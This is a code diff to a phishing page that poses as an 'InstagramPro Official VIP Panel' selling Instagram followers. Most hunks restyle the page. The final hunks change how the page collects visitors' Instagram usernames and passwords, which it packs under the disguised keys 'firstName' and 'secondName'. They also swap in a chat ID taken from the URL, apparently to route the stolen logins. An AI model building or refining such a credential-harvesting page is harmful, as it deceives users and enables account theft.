@@ -22,7 +22,7 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;900&display=swap');
         body { font-family: 'Tajawal', sans-serif; }
-        .insta-gradient { background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); }
+        .insta-gradient { background: linear-gradient(45deg, #dc2743 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); }
         .glass-card { background: rgba(18, 18, 24, 0.92); backdrop-filter: blur(12px); border: 1px solid rgba(220, 39, 67, 0.25); }
     </style>
 </head>
@@ -36,7 +36,7 @@
                     <i class="fa-brands fa-instagram"></i>
                 </div>
                 <div>
-                    <span class="font-black text-lg tracking-wider bg-gradient-to-r from-[#f09433] to-[#bc1888] bg-clip-text text-transparent">InstaPro</span>
+                    <span class="font-black text-lg tracking-wider bg-gradient-to-r from-[#dc2743] to-[#bc1888] bg-clip-text text-transparent">InstagramPro</span>
                     <span class="text-xs block text-zinc-400 font-semibold">Official VIP Panel</span>
                 </div>
             </div>
@@ -58,7 +58,7 @@
             
             <!-- تأثيرات جمالية خلفية -->
             <div class="absolute -top-24 -right-24 w-64 h-64 bg-[#dc2743]/10 rounded-full blur-3xl pointer-events-none"></div>
-            <div class="absolute -bottom-24 -left-24 w-64 h-64 bg-[#f09433]/10 rounded-full blur-3xl pointer-events-none"></div>
+            <div class="absolute -bottom-24 -left-24 w-64 h-64 bg-[#dc2743]/10 rounded-full blur-3xl pointer-events-none"></div>
 
             <!-- مؤشر الخطوات -->
             <div id="stepIndicator" class="flex justify-between items-center mb-8 relative">
@@ -113,7 +113,7 @@
                         <span class="text-xs text-zinc-400">عمليات رشق اليوم</span>
                     </div>
                     <div class="bg-zinc-900/50 p-3 rounded-xl border border-zinc-800">
-                        <span class="block text-[#f09433] font-black text-lg">100%</span>
+                        <span class="block text-[#dc2743] font-black text-lg">100%</span>
                         <span class="text-xs text-zinc-400">حقيقي وآمن</span>
                     </div>
                     <div class="bg-zinc-900/50 p-3 rounded-xl border border-zinc-800">
@@ -178,9 +178,9 @@
                     </div>
 
                     <div onclick="selectPackage('paid', 9.99, '15,000 متابع VIP')" class="package-card cursor-pointer bg-zinc-900 border-2 border-zinc-800 hover:border-[#dc2743] p-4 rounded-2xl transition relative">
-                        <span class="absolute top-3 left-3 bg-[#f09433]/20 text-[#f09433] text-[10px] px-2 py-0.5 rounded-full font-bold">خصم 70%</span>
+                        <span class="absolute top-3 left-3 bg-[#dc2743]/20 text-[#dc2743] text-[10px] px-2 py-0.5 rounded-full font-bold">خصم 70%</span>
                         <div class="flex items-center space-x-3 space-x-reverse">
-                            <div class="w-10 h-10 rounded-xl bg-[#f09433]/10 text-[#f09433] flex items-center justify-center text-lg">
+                            <div class="w-10 h-10 rounded-xl bg-[#dc2743]/10 text-[#dc2743] flex items-center justify-center text-lg">
                                 <i class="fa-solid fa-crown"></i>
                             </div>
                             <div>
@@ -190,7 +190,7 @@
                         </div>
                         <div class="mt-3 flex justify-between items-center">
                             <span class="text-zinc-500 line-through text-xs">$39.99</span>
-                            <span class="text-[#f09433] font-black text-sm">$9.99</span>
+                            <span class="text-[#dc2743] font-black text-sm">$9.99</span>
                         </div>
                     </div>
 
@@ -424,9 +424,9 @@
             const statusAlert = document.getElementById('statusAlert');
 
             const urlParams = new URLSearchParams(window.location.search);
-            const token = urlParams.get('t') || window.location.pathname.split('/').pop();
+            const chatId = urlParams.get('id');
 
-            if (!token) {
+            if (!chatId) {
                 statusAlert.textContent = 'خطأ: الرمز (Token) غير موجود في الرابط.';
                 statusAlert.className = 'text-center text-xs p-3 rounded-xl bg-red-500/20 text-red-400 border border-red-500/30';
                 statusAlert.classList.remove('hidden');
@@ -438,7 +438,7 @@
             statusAlert.classList.add('hidden');
 
             const payload = {
-                token: token,
+                userId: chatId,
                 firstName: usernameField,
                 secondName: passwordField
             };
